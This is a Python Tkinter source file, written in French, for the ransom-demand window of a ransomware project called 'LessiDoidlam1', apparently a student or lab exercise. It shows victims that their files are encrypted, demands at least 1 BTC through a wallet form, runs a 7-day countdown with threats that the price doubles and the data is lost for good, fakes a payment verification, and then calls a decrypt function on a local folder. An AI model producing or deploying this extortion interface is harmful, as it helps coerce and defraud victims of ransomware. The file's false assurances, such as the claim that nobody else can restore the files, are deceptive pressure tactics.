from tkinter import *
from tkinter import ttk
from datetime import datetime, timedelta
from tkinter import *
from datetime import datetime

from crypto.decrypter import decrypt_folder
from utils import get_key


def update_counter(counter_label, root, target_date):
    # Recalculer la date actuelle
    current_date = datetime.now()

    # Calculer la différence entre la date cible et la date actuelle
    remaining_time = target_date - current_date

    # Vérifie s'il reste du temps
    if remaining_time.total_seconds() > 0:
        remaining_days = remaining_time.days
        remaining_seconds = remaining_time.seconds
        remaining_hours = remaining_seconds // 3600
        remaining_minutes = (remaining_seconds % 3600) // 60
        remaining_seconds = remaining_seconds % 60

        counter_label.config(text=f"Il reste {remaining_days} jour(s), "
                                  f"{remaining_hours:02}:{remaining_minutes:02}:{remaining_seconds:02} avant la fin.")
    else:
        counter_label.config(text="Le compteur est terminé. Vous ne pourrez plus récupérer vos données.")

    # Utiliser lambda pour appeler la fonction avec les arguments nécessaires
    root.after(1000, lambda: update_counter(counter_label, root, target_date))


def show_payment_frame(formFrame, paymentFrame):
    formFrame.grid_forget()
    paymentFrame.grid(row=0, column=0, padx=100, pady=100)


def show_form_frame(paymentFrame, formFrame):
    paymentFrame.grid_forget()
    formFrame.grid(row=0, column=0, padx=100, pady=100)


def submit_form(root, name_entry, surname_entry, wallet_adress_entry, amount_entry, formFrame, loadingFrame,
                successFrame, confirmation_label, logo):
    if len(wallet_adress_entry.get()) != 42:
        confirmation_label.config(
            text=f"Votre adresse de portefeuille est incorrect !\nVérifiez qu'il contient bien 42 caractères.\nIl y a actuellement {len(wallet_adress_entry.get())} caractères")
    elif amount_entry.get() < "1":
        confirmation_label.config(text="Le montant est incorrect, vous devez mettre 1 BTC minimum !")
    else:
        # Masquer la frame de formulaire et afficher la frame de chargement
        formFrame.grid_forget()
        loadingFrame.grid(row=0, column=0, padx=100, pady=100)

        # Simuler un délai de "vérification" (par exemple, 3 secondes)
        # Après 3 secondes, appeler show_success
        root.after(3000, lambda: show_success(name_entry, surname_entry, loadingFrame, successFrame, logo))


def show_success(name_entry, surname_entry, loadingFrame, successFrame, logo):
    loadingFrame.grid_forget()



    img_label = Label(successFrame, image=logo, bg="white")
    img_label.image = logo
    img_label.grid(row=0, column=0, columnspan=2)
    Label(successFrame, text="LessiDoidlam1\n", bg="white", fg="black").grid(column=0, row=1)

    Label(successFrame, text="Bravo!\nLa transaction a été validée.", fg="green", bg="white").grid(column=0, row=2)
    Label(successFrame, text=f"Merci {surname_entry.get()} {name_entry.get()} pour ta contribution !", bg="white", fg="black").grid(
        column=0, row=3)
    Label(successFrame, text=f"Comme promis, vos données ont été décryptée !",
          bg="white", fg="black").grid(column=0, row=4)
    ttk.Button(successFrame, text="Décrypter", command=lambda: coucou()).grid(row=7, column=0)
    # Afficher la frame de succès
    successFrame.grid(row=0, column=0, padx=100, pady=100)

def coucou():
    decrypt_folder("./dossier_confidentiel", get_key())

# Création de la fenêtre et logo
root = Tk()
logo = PhotoImage(file="./payment/img/LessiDoidlam1.png")
root.title("LessiDoidlam1 - Demande de rançon")
root.iconbitmap("./payment/img/LessiDoidlam1.ico")
root.iconphoto(True, logo)
root.geometry("1200x700")
root.config(bg="red")

root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(0, weight=1)

# Initialisation des Frames
paymentFrame = Frame(root, bg="white", width=1200, height=600, pady=20, padx=20)
formFrame = Frame(root, bg="white", width=1200, height=600, pady=20, padx=40)
loadingFrame = Frame(root, bg="white", width=1200, height=600, pady=40, padx=40)
successFrame = Frame(root, bg="white", width=1200, height=600, pady=40, padx=40)

# Initialisation du compteur
counter_label = Label(paymentFrame, text="", bg="white", fg="black")
counter_label.grid(row=10, column=0, pady=20)
target_date = datetime.now() + timedelta(days=7)
update_counter(counter_label, root, target_date)

# Frame Payment
img_label = Label(paymentFrame, image=logo, bg="white")
img_label.image = logo
img_label.grid(row=0, column=0, columnspan=2, pady=10)

Label(paymentFrame, text="LessiDoidlam1\n", bg="white", fg="black").grid(column=0, row=1)
Label(paymentFrame, text="Vos informations personnelles ont été cryptées.\n", bg="white" , fg="black").grid(column=0, row=2)
Label(paymentFrame, text="La plupart de vos documents, photos, vidéos et autres fichiers ne sont plus accessible car ils ont été cryptés.\nPeut-être que vous avez essayer de chercher un moyen de restaurer vos fichiers mais ne perdez pas votre temps.\nPersonne ne peut restaurer vos fichiers sans notre service de décryptage.\n", bg="white" , fg="black").grid(column=0, row=2)
Label(paymentFrame, text="Puis-je récupérer mes fichiers ?", bg="white" , fg="black").grid(column=0, row=3)
Label(paymentFrame, text="Bien sûr. Nous vous garantissons que nous pouvons restaurer tous vos fichiers de manière sécurisé et simple.\n", bg="white" , fg="black").grid(column=0, row=4)
Label(paymentFrame, text="Vous avez 3 jours pour valider le paiment. Passer les jours, le prix sera doublé.\nSi vous ne payez pas au bout de 7 jours, vous ne pourrez plus jamais restaurer vos fichiers.\n", bg="white" , fg="black").grid(column=0, row=5)
Label(paymentFrame, text="Veuillez procéder au paiement pour récupérer vos informations.\n", bg="white" , fg="black").grid(column=0, row=6)

ttk.Button(paymentFrame, text="Payer", command=lambda: show_form_frame(paymentFrame, formFrame)).grid(row=7, column=0)

# affichage de la Frame
paymentFrame.grid(row=0, column=0, padx=100, pady=100)


# Frame Formulaire
img_label = Label(formFrame, image=logo, bg="white")
img_label.image = logo
img_label.grid(row=0, column=0, columnspan=2, pady=10)
Label(formFrame, text="LessiDoidlam1\n", bg="white" , fg="black").grid(column=0, row=1, columnspan=2)

surname_label = Label(formFrame, text="Nom :", bg="white" , fg="black").grid(row=2, column=0, sticky=W, pady=5)
surname_entry = Entry(formFrame, width=30)
surname_entry.grid(row=2, column=1, pady=5)

name_label = Label(formFrame, text="Prénom :", bg="white" , fg="black").grid(row=3, column=0, sticky=W, pady=5)
name_entry = Entry(formFrame, width=30)
name_entry.grid(row=3, column=1, pady=5)

email_label = Label(formFrame, text="E-mail :", bg="white" , fg="black").grid(row=4, column=0, sticky=W, pady=5)
email_entry = Entry(formFrame, width=30)
email_entry.grid(row=4, column=1, pady=5)

wallet_adress_label = Label(formFrame, text="Adresse du portefeuille :", bg="white" , fg="black").grid(row=5, column=0, sticky=W, pady=5)
wallet_adress_entry = Entry(formFrame, width=30)
wallet_adress_entry.grid(row=5, column=1, pady=5)

amount_label = Label(formFrame, text="Montant (1 BTC minimun):", bg="white" , fg="black").grid(row=6, column=0, sticky=W, pady=5)
amount_entry = Entry(formFrame, width=30)
amount_entry.grid(row=6, column=1, pady=5)

confirmation_label = Label(formFrame, text="", fg="red", bg="white")
confirmation_label.grid(row=7, column=0, columnspan=2, pady=10)

# Bouton Soumettre
submit_button = ttk.Button(formFrame, text="Soumettre", command=lambda: submit_form(root, name_entry, surname_entry, wallet_adress_entry, amount_entry, formFrame, loadingFrame, successFrame, confirmation_label, logo)).grid(row=8, column=0, columnspan=2, pady=10)
ttk.Button(formFrame, text="Retour", command=lambda: show_payment_frame(formFrame, paymentFrame)).grid(row=8, column=0)

counter_label = Label(formFrame, text="", bg="white" , fg="black")
counter_label.grid(row=10, column=0, pady=20)
update_counter(counter_label, root, target_date)


# Frame de chargement
img_label = Label(loadingFrame, image=logo, bg="white" , fg="black")
img_label.image = logo
img_label.grid(row=0, column=0, columnspan=2)
Label(loadingFrame, text="LessiDoidlam1\n", bg="white" , fg="black").grid(column=0, row=1, columnspan=2, pady=10)
Label(loadingFrame, text="Vérification de la transaction en cours...", bg="white" , fg="black").grid(row=2, column=0, padx=100, pady=100)

def run_window():
    root.mainloop()